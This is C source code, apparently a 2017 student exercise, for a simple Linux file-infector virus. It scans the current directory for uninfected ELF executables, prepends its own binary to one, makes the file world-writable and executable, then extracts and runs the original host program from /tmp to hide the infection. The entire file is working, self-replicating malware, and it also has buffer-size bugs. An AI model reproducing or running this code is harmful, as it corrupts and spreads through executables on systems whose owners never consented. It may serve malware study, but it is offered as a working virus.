// Author : Mahima Singh
// Date : 01 December 2017
// Cited reference : http://www.codewithc.com/how-to-develop-computer-virus-using-c/
//                   https://stackoverflow.com/questions/12822570/how-do-i-check-if-an-object-file-is-in-coff-or-elf-format-from-within-c

#include<stdio.h>
#include<stdlib.h>
#include<string.h>

// This function deletes the temporary files 

void cleanUpTmpFolder(){
      //  printf("Cleanup started\n");
        system("rm -f /tmp/virus038.txt");
        system("rm -f /tmp/elf038.txt");
        system("rm -f /tmp/file038.txt");
        system("rm -f /tmp/myInfect038");
        system("rm -f /tmp/target038");
      //  printf("Cleanup ended\n");
}

// This function checks if the file provided as parameter is an infected file or not

int checkInfected (char filename[])
{
       // printf("Check Infected started\n");
        char o[400],commandBuffer [400];
        char virus[] = "virus";
        snprintf(commandBuffer, sizeof commandBuffer, "%s%s%s", "strings ", filename, "| grep virus > /tmp/virus038.txt");
        FILE *f;
        system(&commandBuffer[0]);
        f = fopen("/tmp/virus038.txt", "r");
        fgets(o,399,f);
       // printf("Check infected ended\n");

        if (strstr(o,virus) != NULL)
           return 1;
        else
           return 0;
}

// This function checks if the file provided is a  ELF executable file

int checkElf(char filename[])
{
       // printf("Check elf started\n");
        char commandBuffer[200],o[200];
        snprintf(commandBuffer, sizeof commandBuffer, "%s%s%s", "file ", filename, " > /tmp/elf038.txt");
        char elf[] = "ELF";
        FILE *f;
        system(&commandBuffer[0]);
        f = fopen("/tmp/elf038.txt", "r");
        fgets(o,199,f);
       // printf("check elf ended!\n");

        if(strstr(o,elf) != NULL)
                return 1;
        else
                return 0;
}

int main(int argc, char* argv[])
{
    FILE *fp; //File pointer
    FILE *targetFile,*currentFile;
    char commandBuffer[500];
    char filename[100];
    system("ls > /tmp/file038.txt"); //list the files in current folder and put in /tmp/file038.txt
    fp = fopen("/tmp/file038.txt", "r"); //open the file in read mode
    while (!feof(fp)) //until end of file is reached
    {
        fgets(filename,300,fp); //reading contents of file in filename
        filename[strlen(filename)-1]='\0';
        if(checkElf(filename))
                {
                   if (checkInfected(filename) == 0)
                        {
                             //   printf("File found which was not infected\n");
                                snprintf(commandBuffer, sizeof commandBuffer, "%s%s%s%s%s%s", "cat virus ", filename, " > /tmp/myInfect038.tmp;mv /tmp/myInfect038.tmp ", filename, ";chmod 777 ", filename);
                                system(&commandBuffer[0]);
                             //   printf("successfully executed infection!");
                                break;
                        }

                }
     }
        if(strstr(argv[0],"virus")!=NULL ){ //  This gets executed when virus is directly run
	printf("Hello! I am a simple virus!\n"); 
	cleanUpTmpFolder();
	exit(0);
	}

	FILE *infile = fopen(argv[0],"rb");
	FILE *virusFile = fopen("virus","rb");
	fseek (infile, 0L, SEEK_END);
	fseek(virusFile,0L, SEEK_END);
	int numBytes  = ftell(infile);
	int virusSize = ftell(virusFile);
	int hostSize =  numBytes - virusSize;
	fseek(infile,virusSize,SEEK_SET);
	unsigned char  *buffer = (char*) calloc(hostSize,sizeof(char));
	if(buffer == NULL) return 1;
	fread(buffer,sizeof(int),hostSize,infile);
	fclose(infile);
	FILE *ftemp = fopen("/tmp/target038","wb");
	fwrite(buffer,sizeof(int),hostSize,ftemp);
	system("chmod 777 /tmp/target038");
	fclose(ftemp);
	free(buffer);
	printf("Hello! I am a simple virus!\n");
 	execv("/tmp/target038",argv);
	cleanUpTmpFolder();
    	return 0;
}

